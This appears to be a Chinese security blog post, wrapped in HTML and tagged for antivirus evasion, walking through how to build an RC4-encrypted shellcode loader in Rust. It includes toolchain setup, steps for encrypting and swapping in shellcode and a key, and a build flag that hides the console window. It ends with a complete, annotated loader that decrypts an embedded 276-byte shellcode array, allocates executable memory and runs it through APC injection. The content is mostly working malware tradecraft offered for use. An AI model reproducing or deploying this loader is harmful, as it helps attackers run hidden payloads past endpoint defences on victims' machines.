@@ -1,0 +1,310 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>rust rc4 loader(炒冷饭2 | .</title>
+<link rel="shortcut icon" href="https://BabelQwerty.github.io/favicon.ico?v=1667388313624">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://BabelQwerty.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="rust rc4 loader(炒冷饭2 | . - Atom Feed" href="https://BabelQwerty.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前提
+
+测试编译工具链：stable-x86_64-pc-windows-gnu
+工具链安装
+
+rustup toolchain install stable-x86_64-pc-windows-gnu
+rustup target add ..." />
+    <meta name="keywords" content="免杀,rust" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://BabelQwerty.github.io">
+  <img class="avatar" src="https://BabelQwerty.github.io/images/avatar.png?v=1667388313624" alt="">
+  </a>
+  <h1 class="site-title">
+    .
+  </h1>
+  <p class="site-description">
+    
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/aboutme" class="menu">
+          aboutme
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              rust rc4 loader(炒冷饭2
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-26
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://BabelQwerty.github.io/tag/r94dgpwNT/" class="post-tag">
+                  # 免杀
+                </a>
+              
+                <a href="https://BabelQwerty.github.io/tag/MAltVUnPOb/" class="post-tag">
+                  # rust
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h4 id="前提">前提</h4>
+<ul>
+<li>测试编译工具链：<code>stable-x86_64-pc-windows-gnu</code></li>
+<li>工具链安装
+<ul>
+<li><code>rustup toolchain install stable-x86_64-pc-windows-gnu</code></li>
+<li><code>rustup target add x86_64-pc-windows-gnu</code></li>
+</ul>
+</li>
+<li>所需要工具：msys64<br>
+将 <code>%\msys64\mingw64\bin\gcc.exe</code> 放到 path 环境变量中即可</li>
+</ul>
+<hr>
+<h2 id="过程">过程</h2>
+<h4 id="加密shellcode">加密shellcode</h4>
+<ul>
+<li>
+<p>替换 shellcode、rc4 key</p>
+</li>
+<li>
+<p>文件 <code>rc4_encode\src\main.rs</code><br>
+<img src="https://BabelQwerty.github.io/post-images/20220608112143.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>执行 <code>rc4_encode\src\main.rs</code>，获取编码后的shellcode<br>
+命令：<code>cargo run</code></p>
+</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://BabelQwerty.github.io/post-images/20220608112301.png" alt="" loading="lazy"></figure>
+<ul>
+<li>替换 loader 文件中的 shellcode、key</li>
+<li>文件 <code>Injection_Rc4_Loader\src\main.rs</code></li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://BabelQwerty.github.io/post-images/20220608112449.png" alt="" loading="lazy"></figure>
+<h4 id="测试-loader">测试 loader</h4>
+<ul>
+<li><code>cargo run </code></li>
+<li>执行出错</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://BabelQwerty.github.io/post-images/20220608113325.png" alt="" loading="lazy"></figure>
+<ul>
+<li>删除父目录中的配置文件 <code>%\OffensiveRust\cargo.toml</code></li>
+<li>再次执行 <code>cargo run</code></li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://BabelQwerty.github.io/post-images/20220608113603.png" alt="" loading="lazy"></figure>
+<hr>
+<h4 id="tips">tips</h4>
+<p>rust 编译命令<br>
+<code>cargo rustc --release -- -Clink-args=&quot;-Wl,--subsystem,windows&quot;</code></p>
+<hr>
+<h4 id="加密过程分析">加密过程分析</h4>
+<pre><code>fn main() {
+
+    // test 是 加密后的shellcode
+
+    let test : [u8;276] =
+
+    [0x76, 0xc2, 0xd1, 0x96, 0xf1, 0x2a, 0x8a, 0xb9, 0xb6, 0xa0, 0x1d, 0x88, 0xb6, 0xde, 0xab, 0x36, 0x9a, 0x5f, 0x68, 0x35, 0x99, 0x91, 0x2e, 0x3a, 0x72, 0x57, 0xaa, 0x8f, 0xce, 0x9d, 0xea, 0xc6, 0x80, 0xe6, 0x43, 0xc7, 0xf3, 0xf2, 0x5b, 0x00, 0x85, 0xa7, 0xc5, 0x23, 0x2f, 0xd9, 0x97, 0xcb, 0x37, 0x9a, 0xe4, 0xf8, 0x5f, 0x55, 0xe5, 0xff, 0x52, 0x0d, 0x59, 0xe5, 0xfe, 0x20, 0x88, 0x6f, 0x1f, 0xd2, 0xf8, 0x94, 0x24, 0x44, 0x0c, 0x5c, 0xd5, 0xb1, 0x57, 0x02, 0xd0, 0x8b, 0xf2, 0x16, 0x3c, 0x28, 0xda, 0xd5, 0x21, 0x35, 0xc2, 0x63, 0x59, 0x43, 0xed, 0xcb, 0x93, 0xd1, 0x35, 0x5b, 0x98, 0x78, 0xd4, 0x28, 0xe7, 0x7d, 0xf3, 0x05, 0xb2, 0xda, 0xaf, 0x95, 0x3c, 0x3a, 0xfb, 0xb6, 0xb7, 0x7a, 0xc8, 0x4e, 0x18, 0xec, 0x28, 0xce, 0x81, 0x5a, 0x32, 0xbc, 0xa5, 0xa0, 0xf9, 0xd1, 0x82, 0xdc, 0xc0, 0x4d, 0xf7, 0x39, 0xf3, 0x3d, 0x05, 0x46, 0x9a, 0xf0, 0xac, 0xa4, 0x88, 0xe8, 0xd4, 0xfe, 0x26, 0xe4, 0xba, 0xb5, 0xf2, 0x81, 0xfe, 0xfc, 0x4d, 0xa0, 0x16, 0xe5, 0xfb, 0xae, 0x84, 0xd0, 0xa9, 0xde, 0xd2, 0x16, 0xb9, 0x4e, 0x5f, 0xe0, 0xf2, 0x1b, 0x10, 0x68, 0x5f, 0x82, 0xab, 0x81, 0x9b, 0xd1, 0xec, 0x2f, 0x50, 0x20, 0x6e, 0x34, 0x2b, 0x01, 0xac, 0xd9, 0x90, 0x75, 0xa3, 0x85, 0x83, 0x8b, 0x5e, 0x46, 0xff, 0xee, 0x28, 0x92, 0x4f, 0xd2, 0xe3, 0x32, 0x58, 0x2e, 0x71, 0xbd, 0x1f, 0x2e, 0xa9, 0xc1, 0x65, 0xe5, 0x3d, 0x48, 0x53, 0xd0, 0xbb, 0x06, 0x90, 0x1f, 0x1e, 0xa1, 0xb9, 0x8c, 0x13, 0x2d, 0x53, 0x36, 0x5a, 0x1f, 0x7a, 0xa8, 0xf9, 0x78, 0xf2, 0x39, 0xa2, 0x10, 0x05, 0x13, 0xae, 0xf6, 0xf1, 0x97, 0xed, 0x81, 0x90, 0xa5, 0xb9, 0x7b, 0x6b, 0x09, 0x36, 0x6f, 0x8a, 0x43, 0x07, 0xe6, 0xa7, 0xa0, 0xc0, 0x46, 0x41, 0xc1, 0xc9, 0xcc, 0x8d, 0x0e, 0x44, 0x0c, 0x6c, 0x1b];
+
+  
+
+    // 声明 cipher 密钥
+
+    let mut cipher = crypto::rc4::Rc4::new(&quot;I_AM_A_KEY&quot;.as_bytes());
+
+    //  因为解密需要输入输出的数组大小一样， 所以将 test 变量复制一份并声明为 o 变量
+
+    let mut o = test.clone();
+
+    // 解密test 数据，并输出到 o 变量
+
+    cipher.process(&amp;test[..],  &amp;mut o);
+
+        // 执行解密后的 o 变量
+
+        unsafe {
+
+            // 声明 内存需要的空指针和内存大小
+
+            let mut allocstart : *mut c_void = null_mut();
+
+            let mut seize : usize = o.len();
+
+            // 开辟内存
+
+            NtAllocateVirtualMemory(NtCurrentProcess,&amp;mut allocstart,0,&amp;mut seize, 0x00003000, 0x40);
+
+            // 在内存中写 shellcode
+
+            NtWriteVirtualMemory(NtCurrentProcess,allocstart,o.as_ptr() as _,o.len() as usize,null_mut());
+
+            // apc注入 , 执行shellcode
+
+            NtQueueApcThread(NtCurrentThread,Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE,allocstart,null_mut(),null_mut());
+
+            // 运行
+
+            NtTestAlert();
+
+        }
+
+}
+</code></pre>
+<hr>
+<p>rc4_loader<br>
+https://github.com/trickster0/OffensiveRust/commit/50acec4dfe311658c9fd677e656d054105cb4ec0</p>
+<p>rc4_encode:<br>
+<a href="https://gitlab.com/-/snippets/2364926">rc4_encode ($2364926) · Snippets · Snippets · GitLab</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E6%8F%90">前提</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E8%BF%87%E7%A8%8B">过程</a><br>
+*
+<ul>
+<li><a href="#%E5%8A%A0%E5%AF%86shellcode">加密shellcode</a></li>
+<li><a href="#%E6%B5%8B%E8%AF%95-loader">测试 loader</a></li>
+<li><a href="#tips">tips</a></li>
+<li><a href="#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">加密过程分析</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://BabelQwerty.github.io/post/kuai-su-cha-zhao-guo-jia-fan-wei-de-ying-yong-fu-wu/">
+              <h3 class="post-title">
+                “快速”查找国家范围的应用服务(炒冷饭1
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/BigDie" target="_blank">BigDie</a>
+  <a class="rss" href="https://BabelQwerty.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
